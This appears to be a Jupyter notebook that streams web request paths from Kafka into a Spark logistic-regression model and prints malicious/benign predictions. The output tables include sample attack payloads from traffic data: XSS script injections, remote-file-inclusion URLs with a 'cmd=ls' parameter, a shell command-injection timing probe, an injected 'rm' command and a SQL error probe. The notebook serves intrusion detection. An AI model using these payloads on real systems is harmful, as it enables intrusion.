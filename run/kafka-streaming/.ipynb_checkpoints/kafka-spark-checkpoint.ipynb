{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Requirements "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Pip Install - findspark + confluent-kafka"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting findspark\n",
      "  Downloading https://files.pythonhosted.org/packages/fc/2d/2e39f9a023479ea798eed4351cd66f163ce61e00c717e03c37109f00c0f2/findspark-1.4.2-py2.py3-none-any.whl\n",
      "Installing collected packages: findspark\n",
      "Successfully installed findspark-1.4.2\n",
      "Collecting confluent-kafka\n",
      "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/48/19/3bbbed00188ccf89b181398b9fcb6612722f9b1e4eeb32528dcc7c5ba0f4/confluent_kafka-1.6.1-cp37-cp37m-manylinux2010_x86_64.whl (2.7MB)\n",
      "\u001b[K    100% |████████████████████████████████| 2.7MB 3.4MB/s ta 0:00:01\n",
      "\u001b[?25hInstalling collected packages: confluent-kafka\n",
      "Successfully installed confluent-kafka-1.6.1\n"
     ]
    }
   ],
   "source": [
    "!pip install findspark\n",
    "!pip install confluent-kafka"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Download - Spark Project External Kafka Assembly"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--2021-04-03 20:52:42--  https://repo1.maven.org/maven2/org/apache/spark/spark-streaming-kafka-0-8-assembly_2.11/2.4.0/spark-streaming-kafka-0-8-assembly_2.11-2.4.0.jar\n",
      "Resolving repo1.maven.org (repo1.maven.org)... 151.101.112.209\n",
      "Connecting to repo1.maven.org (repo1.maven.org)|151.101.112.209|:443... connected.\n",
      "HTTP request sent, awaiting response... 200 OK\n",
      "Length: 13385346 (13M) [application/java-archive]\n",
      "Saving to: ‘spark-streaming-kafka-0-8-assembly_2.11-2.4.0.jar’\n",
      "\n",
      "spark-streaming-kaf 100%[===================>]  12.76M  5.72MB/s    in 2.2s    \n",
      "\n",
      "2021-04-03 20:52:44 (5.72 MB/s) - ‘spark-streaming-kafka-0-8-assembly_2.11-2.4.0.jar’ saved [13385346/13385346]\n",
      "\n"
     ]
    }
   ],
   "source": [
    "!wget https://repo1.maven.org/maven2/org/apache/spark/spark-streaming-kafka-0-8-assembly_2.11/2.4.0/spark-streaming-kafka-0-8-assembly_2.11-2.4.0.jar"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## imports"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import findspark\n",
    "findspark.init('/usr/local/spark/spark-2.4.0-bin-hadoop2.7')\n",
    "os.environ['PYSPARK_SUBMIT_ARGS'] = '--jars spark-streaming-kafka-0-8-assembly_2.11-2.4.0.jar pyspark-shell'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "        <div>\n",
       "            <p><b>SparkContext</b></p>\n",
       "\n",
       "            <p><a href=\"http://192.168.90.65:4040\">Spark UI</a></p>\n",
       "\n",
       "            <dl>\n",
       "              <dt>Version</dt>\n",
       "                <dd><code>v2.4.0</code></dd>\n",
       "              <dt>Master</dt>\n",
       "                <dd><code>local[2]</code></dd>\n",
       "              <dt>AppName</dt>\n",
       "                <dd><code>BigData</code></dd>\n",
       "            </dl>\n",
       "        </div>\n",
       "        "
      ],
      "text/plain": [
       "<SparkContext master=local[2] appName=BigData>"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pyspark\n",
    "from pyspark import SparkContext\n",
    "from pyspark.streaming import StreamingContext\n",
    "from pyspark.sql import SQLContext, Row\n",
    "from pyspark.sql.types import StructType, StructField, DoubleType, StringType, IntegerType\n",
    "from pyspark.sql.functions import udf\n",
    "from pyspark.ml.feature import CountVectorizerModel, IDFModel, StandardScalerModel, Tokenizer\n",
    "from pyspark.ml.classification import LogisticRegressionModel\n",
    "from pyspark.streaming.kafka import KafkaUtils\n",
    "from urllib.parse import unquote\n",
    "\n",
    "#Set spark configuration\n",
    "APP_NAME = \"BigData\"\n",
    "conf = pyspark.SparkConf().setAll([ ('spark.app.name', APP_NAME),\n",
    "                                    ('spark.executor.memory', '8g'),\n",
    "                                    ('spark.cores.max', '2'),\n",
    "                                    ('spark.driver.memory','8g'),\n",
    "                                    ('spark.master', 'local[2]')])\n",
    "sc = SparkContext(conf=conf)\n",
    "sqlc = SQLContext(sc)\n",
    "sc\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## payload to ngram function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "all setup - ready to run\n"
     ]
    }
   ],
   "source": [
    "def to_ngram(payload_obj):\n",
    "    n=2\n",
    "    payload = str(payload_obj)\n",
    "    ngrams = ''\n",
    "    for i in range(0,len(payload)-n + 1):\n",
    "        ngrams += payload[i:i+n]+ ' '\n",
    "    return ngrams[:-1]\n",
    "\n",
    "ngrams = udf(to_ngram, StringType())\n",
    "tokenizer = Tokenizer.load('../models/Tokenizer')\n",
    "vectorizer = CountVectorizerModel.load('../models/Vectorizer')\n",
    "idf_model = IDFModel.load('../models/idf')\n",
    "scalerModel = StandardScalerModel.load('../models/scalerModel')\n",
    "model = LogisticRegressionModel.load('../models/Logistic_Regression_Model')\n",
    "\n",
    "\n",
    "topic = \"test\"\n",
    "brokers = \"localhost:9092\"\n",
    "ssc = StreamingContext(sc, batchDuration= 3)\n",
    "kvs = KafkaUtils.createDirectStream(ssc, [topic], {\"metadata.broker.list\": brokers})\n",
    "\n",
    "\n",
    "print(\"all setup - ready to run\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## queries get predictions  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_prediction(queries):\n",
    "\n",
    "    try:\n",
    "        queries = queries.map(lambda w: Row(payload=w))\n",
    "        queries = sqlc.createDataFrame(queries)\n",
    "        queries = queries.withColumn('ngrams', ngrams(queries['payload']))\n",
    "        queries = tokenizer.transform(queries)\n",
    "        queries = vectorizer.transform(queries)\n",
    "        queries = idf_model.transform(queries)\n",
    "        queries = scalerModel.transform(queries)\n",
    "        preds = model.transform(queries)\n",
    "        preds.select('payload','prediction').show(truncate=False)\n",
    "    except : \n",
    "        print('No data')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## start streaming"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "No data\n",
      "No data\n",
      "No data\n",
      "No data\n",
      "No data\n",
      "+--------------------------------------+----------+\n",
      "|payload                               |prediction|\n",
      "+--------------------------------------+----------+\n",
      "|/tagarela 1/                          |0.0       |\n",
      "|/realplayer10/                        |0.0       |\n",
      "|/6404573/                             |0.0       |\n",
      "|/000023953/                           |0.0       |\n",
      "|/_mocks/                              |0.0       |\n",
      "|/javascript/oaerrordetailpage.svn-base|0.0       |\n",
      "|/041440/                              |0.0       |\n",
      "|/mgnews/                              |0.0       |\n",
      "|/123004/                              |0.0       |\n",
      "|/nettoys/                             |0.0       |\n",
      "+--------------------------------------+----------+\n",
      "\n",
      "+--------------------------------+----------+\n",
      "|payload                         |prediction|\n",
      "+--------------------------------+----------+\n",
      "|/flag_japan/                    |0.0       |\n",
      "|/666865/                        |0.0       |\n",
      "|/136421/                        |0.0       |\n",
      "|/javascript/todo.trace          |0.0       |\n",
      "|/directory_com-coo/             |0.0       |\n",
      "|/seagate pro firewall  an crack/|0.0       |\n",
      "|/javascript/cgm-web.lib         |0.0       |\n",
      "|/welcome-spammers/              |0.0       |\n",
      "|/text_messaging/                |0.0       |\n",
      "|/css/smoothness/jquery-ui.css   |0.0       |\n",
      "|/1781603338/                    |0.0       |\n",
      "|/entete-sponsors/               |0.0       |\n",
      "|/javascript/uploader.sfish      |0.0       |\n",
      "|/main286344/                    |0.0       |\n",
      "|+sqlvuln                        |0.0       |\n",
      "|/thb_bb104s1301/                |0.0       |\n",
      "|/javascript/kids.cgi            |0.0       |\n",
      "|/pornmeister_lia/               |0.0       |\n",
      "|/hisaksson05/                   |0.0       |\n",
      "|/gartner_announcement/          |0.0       |\n",
      "+--------------------------------+----------+\n",
      "\n",
      "+-----------------------------+----------+\n",
      "|payload                      |prediction|\n",
      "+-----------------------------+----------+\n",
      "|/120x60marketplace1/         |0.0       |\n",
      "|/aycanushka/                 |0.0       |\n",
      "|/balanced diet/              |0.0       |\n",
      "|/blackdeckerirons220/        |0.0       |\n",
      "|/javascript/cgi-pub.xls      |0.0       |\n",
      "|/wage conference summary.pdf/|0.0       |\n",
      "|/csowebcast_oracle/          |0.0       |\n",
      "|/submissions/                |0.0       |\n",
      "|/sec_jointwar/               |0.0       |\n",
      "|/kerst2005/                  |0.0       |\n",
      "+-----------------------------+----------+\n",
      "\n",
      "+--------------------------------------------------------------------------------------------------------+----------+\n",
      "|payload                                                                                                 |prediction|\n",
      "+--------------------------------------------------------------------------------------------------------+----------+\n",
      "|/ingree/                                                                                                |0.0       |\n",
      "|/telecomm/                                                                                              |0.0       |\n",
      "|/comp_news/                                                                                             |0.0       |\n",
      "|/cocacola/                                                                                              |0.0       |\n",
      "|/examples/jsp/checkbox/error.php?selected_theme=<script>alert(uebimiau_selected_theme_xss.nasl)</script>|1.0       |\n",
      "|/20050706/                                                                                              |0.0       |\n",
      "|/serielimitee/                                                                                          |0.0       |\n",
      "|/181345/                                                                                                |0.0       |\n",
      "|/1210598223/                                                                                            |0.0       |\n",
      "|/000023136/                                                                                             |0.0       |\n",
      "|/image icon converter v1/                                                                               |0.0       |\n",
      "|/1163871338580/                                                                                         |0.0       |\n",
      "|/xml-xindice/                                                                                           |0.0       |\n",
      "|/bannerper/                                                                                             |0.0       |\n",
      "|/admin/news.admin.php?path_to_script=http://192.168.202.118:8080/tzhfyzkbomspvm??&cmd=ls                |1.0       |\n",
      "|/w3c-translators/                                                                                       |0.0       |\n",
      "|/index.php?txt=http://192.168.202.118:8080/ghl9il?                                                      |0.0       |\n",
      "|/dprframeweb/                                                                                           |0.0       |\n",
      "|/download-001005405/                                                                                    |0.0       |\n",
      "|/javascript/fb.pfx                                                                                      |0.0       |\n",
      "+--------------------------------------------------------------------------------------------------------+----------+\n",
      "\n",
      "+--------------------------------+----------+\n",
      "|payload                         |prediction|\n",
      "+--------------------------------+----------+\n",
      "|/img_3045/                      |0.0       |\n",
      "|/standevidenceonidcardstohasc/  |0.0       |\n",
      "|/90x90_20061213175311/          |0.0       |\n",
      "|/1111704/                       |0.0       |\n",
      "|/356772/                        |0.0       |\n",
      "|/photo_puzzle/                  |0.0       |\n",
      "|/177922/                        |0.0       |\n",
      "|/010107/                        |0.0       |\n",
      "|/javascript/definition.stackdump|0.0       |\n",
      "|/javascript/include.war         |0.0       |\n",
      "+--------------------------------+----------+\n",
      "\n",
      "+--------------------------------------------------------------------------------------------+----------+\n",
      "|payload                                                                                     |prediction|\n",
      "+--------------------------------------------------------------------------------------------+----------+\n",
      "|/warkanoid_2/                                                                               |0.0       |\n",
      "|/kfibbk15.ashx                                                                              |0.0       |\n",
      "|/clanki/                                                                                    |0.0       |\n",
      "|/javascript/engine.jsf                                                                      |0.0       |\n",
      "|/worldwidecustomersites/                                                                    |0.0       |\n",
      "|/board_alt/                                                                                 |0.0       |\n",
      "|/new woman platinum collection/                                                             |0.0       |\n",
      "|/morales121506opn/                                                                          |0.0       |\n",
      "|/113460536908792619/                                                                        |0.0       |\n",
      "|/eurocis2007/                                                                               |0.0       |\n",
      "|/javascript/ingress.properties                                                              |0.0       |\n",
      "|/_shoutcast/                                                                                |0.0       |\n",
      "|/msi traymanager/                                                                           |0.0       |\n",
      "|/cs_indiana/                                                                                |0.0       |\n",
      "|\n",
      " str=$(echo MKJXCW)\n",
      " str1=${#str}\n",
      " if [ 4 -ne ${str1} ]\n",
      " then sleep 0\n",
      " else sleep 1\n",
      " fi %27|1.0       |\n",
      "|/intro_black/                                                                               |0.0       |\n",
      "|/javascript/computer.cfm                                                                    |0.0       |\n",
      "|/javascript/software.asmx                                                                   |0.0       |\n",
      "|/girlfriend135/                                                                             |0.0       |\n",
      "|/20051220-11/                                                                               |0.0       |\n",
      "+--------------------------------------------------------------------------------------------+----------+\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-------------------------------------------------------------------------------+----------+\n",
      "|payload                                                                        |prediction|\n",
      "+-------------------------------------------------------------------------------+----------+\n",
      "|/?<script>document.cookie=\"testqppc=8767;\"</script>                            |1.0       |\n",
      "|/gpb/include/gpb.inc.php?root_path=http://192.168.202.118:8080/tzhfyzkbomspvm??|0.0       |\n",
      "|/en-us/jnv890lt.cfm?<script>cross_site_scripting.nasl</script>                 |1.0       |\n",
      "|/w32rbotaqs/                                                                   |0.0       |\n",
      "|/javascript/7z.xml                                                             |0.0       |\n",
      "|/107845/                                                                       |0.0       |\n",
      "|/design6/                                                                      |0.0       |\n",
      "|/051318/                                                                       |0.0       |\n",
      "|/d04725r/                                                                      |0.0       |\n",
      "|/130603/                                                                       |0.0       |\n",
      "+-------------------------------------------------------------------------------+----------+\n",
      "\n",
      "+-----------------------------------------------------------------------+----------+\n",
      "|payload                                                                |prediction|\n",
      "+-----------------------------------------------------------------------+----------+\n",
      "|/574527/                                                               |0.0       |\n",
      "|/topic06/                                                              |0.0       |\n",
      "|/rumormill/                                                            |0.0       |\n",
      "|/msg00000/                                                             |0.0       |\n",
      "|/final fantasy viii - disc 1/                                          |0.0       |\n",
      "|/index.asp?fid=412585577799'error                                      |1.0       |\n",
      "|/top.php?stuff=\\x0arm q86844442 #                                      |0.0       |\n",
      "|/michaeltobis/                                                         |0.0       |\n",
      "|/146237/                                                               |0.0       |\n",
      "|/tabledraw_1/                                                          |0.0       |\n",
      "|/article661/                                                           |0.0       |\n",
      "|/58245652/                                                             |0.0       |\n",
      "|/formslogin2/                                                          |0.0       |\n",
      "|/javascript/view.save                                                  |0.0       |\n",
      "|/javascript/automation.key                                             |0.0       |\n",
      "|/javascript/secure.htm                                                 |0.0       |\n",
      "|/acgvnews/header.php?pathnews=http://192.168.202.96:8080/whmch8ftkt7kv?|0.0       |\n",
      "|/cpanplus/                                                             |0.0       |\n",
      "|/climbing-accessories/                                                 |0.0       |\n",
      "|/javascript/lucene.cfg                                                 |0.0       |\n",
      "+-----------------------------------------------------------------------+----------+\n",
      "\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-7-67590a0d7019>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0mssc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstart\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 7\u001b[0;31m \u001b[0mssc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mawaitTermination\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m/usr/local/spark/spark-2.4.0-bin-hadoop2.7/python/pyspark/streaming/context.py\u001b[0m in \u001b[0;36mawaitTermination\u001b[0;34m(self, timeout)\u001b[0m\n\u001b[1;32m    190\u001b[0m         \"\"\"\n\u001b[1;32m    191\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mtimeout\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 192\u001b[0;31m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_jssc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mawaitTermination\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    193\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    194\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_jssc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mawaitTerminationOrTimeout\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtimeout\u001b[0m \u001b[0;34m*\u001b[0m \u001b[0;36m1000\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/spark/spark-2.4.0-bin-hadoop2.7/python/lib/py4j-0.10.7-src.zip/py4j/java_gateway.py\u001b[0m in \u001b[0;36m__call__\u001b[0;34m(self, *args)\u001b[0m\n\u001b[1;32m   1253\u001b[0m             \u001b[0mproto\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mEND_COMMAND_PART\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1254\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1255\u001b[0;31m         \u001b[0manswer\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mgateway_client\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msend_command\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcommand\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1256\u001b[0m         return_value = get_return_value(\n\u001b[1;32m   1257\u001b[0m             answer, self.gateway_client, self.target_id, self.name)\n",
      "\u001b[0;32m/usr/local/spark/spark-2.4.0-bin-hadoop2.7/python/lib/py4j-0.10.7-src.zip/py4j/java_gateway.py\u001b[0m in \u001b[0;36msend_command\u001b[0;34m(self, command, retry, binary)\u001b[0m\n\u001b[1;32m    983\u001b[0m         \u001b[0mconnection\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_get_connection\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    984\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 985\u001b[0;31m             \u001b[0mresponse\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mconnection\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msend_command\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcommand\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    986\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0mbinary\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    987\u001b[0m                 \u001b[0;32mreturn\u001b[0m \u001b[0mresponse\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_create_connection_guard\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mconnection\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/spark/spark-2.4.0-bin-hadoop2.7/python/lib/py4j-0.10.7-src.zip/py4j/java_gateway.py\u001b[0m in \u001b[0;36msend_command\u001b[0;34m(self, command)\u001b[0m\n\u001b[1;32m   1150\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1151\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1152\u001b[0;31m             \u001b[0manswer\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msmart_decode\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstream\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreadline\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m-\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1153\u001b[0m             \u001b[0mlogger\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdebug\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Answer received: {0}\"\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0manswer\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1154\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0manswer\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstartswith\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mproto\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mRETURN_MESSAGE\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/anaconda3/lib/python3.7/socket.py\u001b[0m in \u001b[0;36mreadinto\u001b[0;34m(self, b)\u001b[0m\n\u001b[1;32m    587\u001b[0m         \u001b[0;32mwhile\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    588\u001b[0m             \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 589\u001b[0;31m                 \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_sock\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv_into\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mb\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    590\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mtimeout\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    591\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_timeout_occurred\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "queries = kvs.map(lambda x: unquote(x[1]))\n",
    "# ngrams = queries.map(lambda x: to_ngram(x))\n",
    "queries.foreachRDD(get_prediction)\n",
    "\n",
    "\n",
    "ssc.start()\n",
    "ssc.awaitTermination()  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
